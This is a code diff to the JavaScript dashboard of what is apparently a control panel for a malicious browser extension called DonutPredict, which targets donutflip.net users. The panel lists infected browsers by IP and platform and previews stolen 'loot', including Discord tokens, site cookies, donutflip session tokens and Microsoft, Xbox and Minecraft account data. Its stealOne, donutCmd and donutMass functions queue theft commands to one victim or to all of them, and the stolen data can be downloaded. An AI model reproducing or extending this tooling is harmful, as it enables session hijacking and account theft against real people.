@@ -1014,8 +1014,9 @@ async function refreshBrowsers() {
   } catch (e) { return; }
 
   const q = (document.getElementById('browser-search')?.value || '').toLowerCase();
+  // Browsers page: show all extension clients, but label donut ones
   const filtered = list.filter(b => {
-    const blob = `${b.eid||''} ${b.ip||''} ${b.ua||''} ${b.browser||''} ${b.platform||''}`.toLowerCase();
+    const blob = `${b.eid||''} ${b.ip||''} ${b.ua||''} ${b.browser||''} ${b.platform||''} ${b.kind||''}`.toLowerCase();
     return !q || blob.includes(q);
   });
 
@@ -1047,11 +1048,13 @@ async function refreshBrowsers() {
       onclick="window.openBrowserDetail && window.openBrowserDetail('${eidSafe}')">
       <div class="machine-top">
         <div>
-          <div class="machine-name">${pin}${browser} ${b.ver||''}</div>
+          <div class="machine-name">${pin}${browser} ${b.ver||''} · ${(b.eid||'').slice(0,10)}</div>
           <div class="machine-user">${b.ip||'?'} · ${plat} · ${b.lang||''}</div>
         </div>
         <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
-          <span class="tag mild">${b.loot_count||0} loot</span>
+          <span class="tag mild">${b.loot_count||0} LOOT</span>
+          ${(b.kind==='donutpredict'||b.donutflip)?'<span class="tag">DF</span>':''}
+          ${b.has_session?'<span class="tag live">session</span>':''}
           ${rbx}
         </div>
       </div>
@@ -1125,10 +1128,22 @@ async function loadBrowserLootFor(eid) {
       const latest = arr[arr.length-1];
       let preview = '';
       const d = latest.data;
-      if (typeof d === 'string') preview = d.slice(0, 120);
-      else if (typ.includes('discord')) preview = (d && d.tokens) ? (d.tokens.length + ' token(s)') : JSON.stringify(d).slice(0,100);
-      else if (Array.isArray(d)) preview = d.length + ' entries';
-      else preview = JSON.stringify(d).slice(0, 100);
+      if (typeof d === 'string') preview = d.slice(0, 160);
+      else if (typ.includes('discord')) preview = (d && d.tokens) ? (d.tokens.length + ' token(s)') : JSON.stringify(d).slice(0,120);
+      else if (typ === 'donutflip_cookies' || typ === 'donutflip_cookies_auto') {
+        const n = d && (d.count != null ? d.count : (d.cookies ? d.cookies.length : '?'));
+        const tok = d && d.session_token;
+        preview = n + ' cookies' + (tok ? (' · session_token ' + String(tok).slice(0,36) + '…') : (d && d.has_session_token ? ' · session YES' : ''));
+        if (d && d.export_style && d.export_style[0]) preview += ' · ' + (d.export_style[0]['Name raw'] || '');
+      } else if (typ === 'donutflip_session_token' || typ === 'donutflip_device') {
+        preview = (d && d.name ? d.name + '=' : '') + String((d && d.value) || '').slice(0, 64);
+      } else if (typ === 'minecraft_pack') {
+        preview = 'msa ' + ((d&&d.microsoft)||[]).length + ' · xbox ' + ((d&&d.xbox)||[]).length + ' · mc ' + ((d&&d.minecraft)||[]).length;
+      } else if (typ.startsWith('cookies_')) {
+        preview = (d && d.count != null ? d.count : (d && d.cookies ? d.cookies.length : '?')) + ' cookies (' + (d && d.site || typ) + ')';
+      } else if (Array.isArray(d)) preview = d.length + ' entries';
+      else if (d && d.count != null && d.cookies) preview = d.count + ' cookies';
+      else preview = JSON.stringify(d).slice(0, 120);
       return `<div class="steal-card" style="margin-bottom:8px">
         <div style="display:flex;justify-content:space-between;gap:8px">
           <strong>${typ}</strong>
@@ -1159,14 +1174,19 @@ async function pushDropOne(eid) {
 }
 
 async function stealOne(eid, cmd) {
+  const c = cmd || 'both';
   try {
+    await fetch('/api/browser/push', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({cmd: c, eid})
+    }).catch(()=>{});
     const r = await fetch('/api/browser/cmd', {
       method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({cmd: cmd || 'both', eid})
+      body: JSON.stringify({cmd: c, eid})
     });
     const d = await r.json().catch(()=>({}));
     if (!r.ok) { toast(d.error || 'steal failed'); return; }
-    toast('grab queued');
+    toast('grab queued · ' + c);
     setTimeout(() => loadBrowserLootFor(eid), 2500);
   } catch (e) { toast('steal error'); }
 }
@@ -1605,15 +1625,25 @@ window.closeAndroidDetail = function() {
   _closeAndroidDetail();
 };
 
+
 /* ========== DonutPredict clients ========== */
 let currentDonutEid = null;
 
 function isDonutClient(b) {
   if (!b) return false;
-  const k = (b.kind || b.source || b.browser || "").toLowerCase();
+  const k = String(b.kind || b.source || b.browser || "").toLowerCase();
   if (k.includes("donut") || b.donutflip === true) return true;
-  if ((b.eid || "").startsWith("df_")) return true;
+  if (String(b.eid || "").startsWith("df_")) return true;
   return false;
+}
+
+function browserNameFrom(b) {
+  if (b.browser) return b.browser;
+  const ua = b.ua || "";
+  if (/Firefox/i.test(ua)) return "Firefox";
+  if (/Edg/i.test(ua)) return "Edge";
+  if (/Chrome/i.test(ua)) return "Chrome";
+  return "Browser";
 }
 
 async function refreshDonut() {
@@ -1624,77 +1654,145 @@ async function refreshDonut() {
     list = await r.json();
     if (!Array.isArray(list)) list = list.browsers || list.clients || [];
   } catch (e) { return; }
+
   list = list.filter(isDonutClient);
   const q = (document.getElementById("donut-search")?.value || "").toLowerCase();
   if (q) list = list.filter(b => JSON.stringify(b).toLowerCase().includes(q));
+
   const count = document.getElementById("donut-count");
-  if (count) count.textContent = list.length + " DonutPredict client" + (list.length === 1 ? "" : "s");
+  if (count) count.textContent = list.length + " client" + (list.length === 1 ? "" : "s");
+
   const box = document.getElementById("donut-list");
   if (!box) return;
+
+  // hide list while detail open? keep visible like browsers
   if (!list.length) {
-    box.innerHTML = '<div class="empty">No DonutPredict clients yet — load the extension on a browser visiting donutflip.net</div>';
+    box.innerHTML = `<div class="empty-state" style="grid-column:1/-1;padding:60px">
+      <div>No DonutPredict clients yet</div>
+      <div style="font-size:.8rem">load the extension · visit donutflip.net</div>
+    </div>`;
     return;
   }
+
   box.innerHTML = list.map(b => {
     const eid = b.eid || "";
-    const last = b.last_seen || b.last || "—";
-    const cookies = b.cookie_count != null ? b.cookie_count : "—";
-    return `<div class="machine-card" onclick="openDonut('${eid}')">
+    const eidSafe = String(eid).replaceAll("\\", "\\\\").replaceAll("'", "\\'");
+    const browser = browserNameFrom(b);
+    const loot = b.loot_count != null ? b.loot_count : (Array.isArray(b.loot) ? b.loot.length : 0);
+    const sess = b.has_session ? '<span class="tag live">session</span>' : '';
+    const ck = b.cookie_count != null ? b.cookie_count + " ck" : "";
+    return `<div class="machine" role="button" tabindex="0" style="cursor:pointer"
+      onclick="window.openDonut && window.openDonut('${eidSafe}')">
       <div class="machine-top">
-        <div class="machine-name">DF ${esc(eid).slice(0, 14)}…</div>
-        <span class="pill">${esc(String(cookies))} ck</span>
+        <div>
+          <div class="machine-name">${browser} · ${eid.slice(0, 12)}…</div>
+          <div class="machine-user">${b.ip || "?"} · ${b.platform || "—"} · ${b.lang || ""}</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
+          <span class="tag mild">${loot} LOOT</span>
+          ${sess}
+        </div>
       </div>
-      <div class="machine-meta">last ${esc(String(last)).slice(0, 19)}</div>
+      <div class="machine-meta">
+        <span>ext ${b.ext_ver || "1.x"}</span>
+        <span>${ck}</span>
+        <span class="ago">${b.last_seen || ""}</span>
+      </div>
     </div>`;
   }).join("");
+}
+
+function closeDonutDetail() {
+  currentDonutEid = null;
+  document.getElementById("donut-detail")?.classList.add("hidden");
 }
 
 async function openDonut(eid) {
   currentDonutEid = eid;
   const det = document.getElementById("donut-detail");
   if (det) det.classList.remove("hidden");
-  document.getElementById("donut-title").textContent = "Donut · " + eid.slice(0, 16);
-  document.getElementById("donut-meta").textContent = "loading…";
-  document.getElementById("donut-loot").innerHTML = "";
+  document.getElementById("donut-title").textContent = "Donut · " + String(eid).slice(0, 18);
+  document.getElementById("donut-sub").textContent = eid;
+  document.getElementById("donut-loot").innerHTML = "loading…";
+  document.getElementById("donut-meta").textContent = "";
+  const zip = document.getElementById("donut-zip-link");
+  if (zip) zip.href = "/api/browser/loot_zip/" + encodeURIComponent(eid);
+
   try {
     const r = await fetch("/api/browser/list", { credentials: "same-origin" });
     const list = await r.json();
     const arr = Array.isArray(list) ? list : (list.browsers || []);
     const b = arr.find(x => x.eid === eid) || {};
-    document.getElementById("donut-meta").textContent = JSON.stringify({
-      eid: b.eid, ip: b.ip, ua: b.ua, kind: b.kind, last_seen: b.last_seen,
-      cookie_count: b.cookie_count, donutflip: b.donutflip
-    }, null, 2);
+    const lootN = b.loot_count != null ? b.loot_count : (Array.isArray(b.loot) ? b.loot.length : 0);
+    document.getElementById("df-loot-count").textContent = lootN + " loot";
+    document.getElementById("df-session-tag").textContent = b.has_session ? "session yes" : "session ?";
+    document.getElementById("df-session-tag").className = "tag" + (b.has_session ? " live" : "");
+    document.getElementById("donut-title").textContent = browserNameFrom(b) + " · " + String(eid).slice(0, 14);
+    document.getElementById("donut-meta").textContent = [
+      "ip: " + (b.ip || "—"),
+      "ua: " + (b.ua || "—"),
+      "platform: " + (b.platform || "—"),
+      "lang: " + (b.lang || "—"),
+      "cookies(df): " + (b.cookie_count != null ? b.cookie_count : "—"),
+      "last: " + (b.last_seen || "—"),
+      "kind: " + (b.kind || "donutpredict")
+    ].join("\n");
   } catch (e) {}
+
   try {
     const r = await fetch("/api/browser/loot/" + encodeURIComponent(eid));
     const data = await r.json();
     const loot = data.loot || data || [];
     const box = document.getElementById("donut-loot");
     if (!Array.isArray(loot) || !loot.length) {
-      box.innerHTML = "<div class='muted'>no loot yet</div>";
+      box.innerHTML = "no loot yet";
       return;
     }
-    box.innerHTML = loot.slice().reverse().slice(0, 30).map(e => {
+    box.innerHTML = loot.slice().reverse().slice(0, 40).map(e => {
       const typ = e.type || "loot";
-      const preview = typeof e.data === "string" ? e.data.slice(0, 120) : JSON.stringify(e.data || {}).slice(0, 160);
+      let preview = "";
+      const d = e.data;
+      if (typ === "donutflip_cookies" || typ === "donutflip_cookies_auto") {
+        const count = d && d.count != null ? d.count : (d && d.cookies ? d.cookies.length : "?");
+        const has = d && (d.session_token || d.has_session_token) ? " · session_token YES" : "";
+        const names = d && d.names ? d.names.slice(0, 6).join(", ") : (d && d.session_cookies ? d.session_cookies.map(c => c.name).slice(0, 4).join(", ") : "");
+        preview = `cookies: ${count}${has}${names ? "\\n" + names : ""}`;
+        if (d && d.session_token) preview += "\\n__Host-donutflip.session_token: " + String(d.session_token).slice(0, 48) + "…";
+      } else if (typ === "donutflip_session_token") {
+        preview = (d && d.name ? d.name + " = " : "") + String((d && d.value) || d || "").slice(0, 80);
+      } else if (typeof d === "string") {
+        preview = d.slice(0, 160);
+      } else {
+        preview = JSON.stringify(d || {}).slice(0, 200);
+      }
       return `<div class="steal-card"><b>${esc(typ)}</b> <span class="muted">${esc(e.ts || "")}</span>
-        <pre style="font-size:11px;white-space:pre-wrap">${esc(preview)}</pre>
+        <pre style="font-size:11px;white-space:pre-wrap;margin:6px 0">${esc(preview)}</pre>
         <a class="cmd sm" href="/api/browser/loot_download/${encodeURIComponent(eid)}?type=${encodeURIComponent(typ)}" download>Download</a>
       </div>`;
     }).join("");
-  } catch (e) {}
+  } catch (e) {
+    document.getElementById("donut-loot").textContent = "loot load failed";
+  }
 }
 
 async function donutCmd(cmd) {
   if (!currentDonutEid) return toast("select a client");
-  await fetch("/api/browser/push", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ eid: currentDonutEid, cmd, args: {} })
-  }).catch(() => {});
+  try {
+    await fetch("/api/browser/push", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ eid: currentDonutEid, cmd, args: {} })
+    });
+  } catch (e) {}
+  try {
+    await fetch("/api/browser/cmd", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ eid: currentDonutEid, cmd, args: {} })
+    });
+  } catch (e) {}
   toast("queued " + cmd);
-  setTimeout(() => openDonut(currentDonutEid), 1500);
+  setTimeout(() => openDonut(currentDonutEid), 2000);
 }
 
 async function donutMass(cmd) {
@@ -1709,7 +1807,7 @@ async function donutMass(cmd) {
         body: JSON.stringify({ eid: b.eid, cmd, args: {} })
       });
     }
-    toast("queued " + cmd + " on " + arr.length);
+    toast("queued " + cmd + " × " + arr.length);
   } catch (e) { toast("mass failed"); }
 }
 
@@ -1721,13 +1819,13 @@ async function donutDelete() {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ eid: currentDonutEid })
   });
-  currentDonutEid = null;
-  document.getElementById("donut-detail")?.classList.add("hidden");
+  closeDonutDetail();
   refreshDonut();
 }
 
 window.refreshDonut = refreshDonut;
 window.openDonut = openDonut;
+window.closeDonutDetail = closeDonutDetail;
 window.donutCmd = donutCmd;
 window.donutMass = donutMass;
 window.donutDelete = donutDelete;
